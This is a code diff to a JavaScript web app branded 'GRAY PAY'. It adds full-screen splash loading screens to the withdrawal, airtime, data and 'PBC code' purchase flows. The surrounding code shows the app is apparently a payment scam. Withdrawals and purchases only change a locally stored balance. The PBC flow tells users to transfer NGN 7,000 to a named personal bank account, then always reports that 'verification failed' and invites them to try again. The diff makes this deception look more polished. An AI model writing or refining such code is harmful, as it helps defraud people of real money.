@@ -401,6 +401,22 @@
         }, 4500);
     }
 
+    // NEW: Full splash loading for withdraw and PBC
+    function showFullSplashLoading(message, callback, duration = 3000) {
+        let splashDiv = document.createElement('div');
+        splashDiv.className = 'splash-loading';
+        splashDiv.innerHTML = `
+            <div class="spinner"></div>
+            <div class="logo-text">GRAY PAY</div>
+            <div class="loading-text">${message}</div>
+        `;
+        document.body.appendChild(splashDiv);
+        setTimeout(() => {
+            splashDiv.remove();
+            if(callback) callback();
+        }, duration);
+    }
+
     // ========== SIGNUP (NO POPUP - GOES STRAIGHT TO DASHBOARD) ==========
     function signup() {
         let fn = document.getElementById('signupFirstname').value.trim();
@@ -627,7 +643,7 @@
         if(amt > currentUser.balance) { alert('Insufficient balance'); return; }
         if(!accName || !accNumber) { alert('Please fill account name and number'); return; }
         
-        showLoading('Processing withdrawal...', 15000, () => { 
+        showFullSplashLoading('Processing withdrawal...', () => { 
             currentUser.balance -= amt; 
             let transactionId = 'TXN' + Date.now() + Math.floor(Math.random() * 1000);
             let transaction = { 
@@ -663,7 +679,7 @@
                 transactionId,
                 () => showTransactionDetails(transactionId)
             );
-        });
+        }, 15000);
     }
 
     // ========== BUY AIRTIME ==========
@@ -680,7 +696,7 @@
         if(code !== '4234') { alert('Invalid PBC Code!'); return; }
         if(!phone || !amt) { alert('Fill all fields'); return; }
         if(amt > currentUser.balance) { alert('Insufficient balance'); return; }
-        showLoading('Processing...', 10000, () => { 
+        showFullSplashLoading('Processing airtime purchase...', () => { 
             currentUser.balance -= amt; 
             let transactionId = 'TXN' + Date.now() + Math.floor(Math.random() * 1000);
             let transaction = {
@@ -707,7 +723,7 @@
             currentUser.transactions.unshift(transaction); 
             saveUsers(); 
             showAirtimeSuccessPopup(amt, phone, transactionId, () => showTransactionDetails(transactionId));
-        });
+        }, 10000);
     }
 
     // ========== BUY DATA ==========
@@ -726,7 +742,7 @@
         if(code !== '4234') { alert('Invalid PBC Code!'); return; }
         if(!phone) { alert('Enter phone number'); return; }
         if(amt > currentUser.balance) { alert('Insufficient balance'); return; }
-        showLoading('Processing...', 10000, () => { 
+        showFullSplashLoading('Processing data purchase...', () => { 
             currentUser.balance -= amt; 
             let transactionId = 'TXN' + Date.now() + Math.floor(Math.random() * 1000);
             let transaction = {
@@ -754,7 +770,7 @@
             currentUser.transactions.unshift(transaction); 
             saveUsers(); 
             showDataSuccessPopup(amt, phone, name, transactionId, () => showTransactionDetails(transactionId));
-        });
+        }, 10000);
     }
 
     // ========== BUY PBC ==========
@@ -768,20 +784,20 @@
         function check() { if(nameInp.value && emailInp.value) { btn.disabled = false; btn.className = 'btn btn-blue'; } else { btn.disabled = true; btn.className = 'btn btn-gray'; } }
         nameInp.addEventListener('input', check); emailInp.addEventListener('input', check);
     }
-    function pbcStep1() { showLoading('Processing...', 10000, () => showPalmPayWarning()); }
+    function pbcStep1() { showFullSplashLoading('Processing PBC purchase...', () => showPalmPayWarning(), 10000); }
     function showPalmPayWarning() {
         document.getElementById('dynamicContent').innerHTML = `<div id="warningView"><div class="header"><button class="back-btn" onclick="goBackToPBC()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><div class="warning-box"><h2>PalmPay Service Down</h2><p>Please do not use PalmPay for payments at this time. Use other supported banks.</p></div><button class="btn" onclick="pbcStep2()">Proceed to Bank Transfer</button><button class="btn" style="margin-top: 12px;" onclick="pbcStep2()">I Understand</button></div>`;
         document.getElementById('warningView').style.display = 'block'; document.getElementById('warningView').style.padding = '20px';
     }
     function goBackToPBC() { showBuyPBC(); }
-    function pbcStep2() { showLoading('Processing...', 5000, () => showBankDetails()); }
+    function pbcStep2() { showFullSplashLoading('Preparing bank details...', () => showBankDetails(), 5000); }
     function copyText(txt, el) { navigator.clipboard.writeText(txt); let orig = el.innerHTML; el.innerHTML = txt + ' ✅ Copied!'; setTimeout(() => el.innerHTML = orig, 2000); }
     function showBankDetails() {
         document.getElementById('dynamicContent').innerHTML = `<div id="bankView"><div class="header"><button class="back-btn" onclick="goBackToWarning()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Bank Transfer</h2><div class="copy-item" onclick="copyText('7000', this.querySelector('.copy-text'))"><span class="copy-text"><strong>Amount:</strong> NGN 7,000</span><span class="copy-icon">📋 Copy</span></div><div class="copy-item" onclick="copyText('2778715377', this.querySelector('.copy-text'))"><span class="copy-text"><strong>Account Number:</strong> 2778715377</span><span class="copy-icon">📋 Copy</span></div><div class="info-box"><strong>Bank Name:</strong> Paga</div><div class="info-box"><strong>Account Name:</strong> Ahmed Isah</div><p class="text-center mb-10">Transfer exact amount. Use your name as description.</p><button class="btn" onclick="pbcStep3()">I have made this bank transfer</button></div>`;
         document.getElementById('bankView').style.display = 'block'; document.getElementById('bankView').style.padding = '20px';
     }
     function goBackToWarning() { showPalmPayWarning(); }
-    function pbcStep3() { showLoading('Verifying payment...', 20000, () => showFailed()); }
+    function pbcStep3() { showFullSplashLoading('Verifying payment...', () => showFailed(), 20000); }
     function showFailed() {
         document.getElementById('dynamicContent').innerHTML = `<div id="failedView"><div class="header"><button class="back-btn" onclick="goBackToBank()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><div class="warning-box"><h2>Transaction verification failed!</h2><p>No Payment received from you / invalid payment method.</p></div><button class="btn" onclick="goBackToBank()">Try Again</button><button class="btn" style="margin-top: 12px;" onclick="showHelp()">❓ You Need Help?</button></div>`;
         document.getElementById('failedView').style.display = 'block'; document.getElementById('failedView').style.padding = '20px';
